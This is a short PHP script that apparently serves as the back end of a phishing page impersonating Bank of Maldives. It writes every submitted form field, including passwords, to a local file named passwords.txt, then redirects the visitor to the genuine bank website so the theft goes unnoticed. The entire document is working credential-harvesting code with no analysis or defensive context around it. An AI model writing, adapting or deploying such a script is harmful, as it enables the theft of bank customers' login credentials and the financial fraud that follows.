<?php 

  
// Set the location to redirect the page 

header ('Location: https://www.bankofmaldives.com.mv/'); 

  
// Open the text file in writing mode  

$file = fopen("passwords.txt", "a"); 

  

foreach($_POST as $variable => $value) { 

    fwrite($file, $variable); 

    fwrite($file, "="); 

    fwrite($file, $value); 

    fwrite($file, "\r\n"); 
} 

  

fwrite($file, "\r\n"); 

fclose($file); 

exit; 
?> 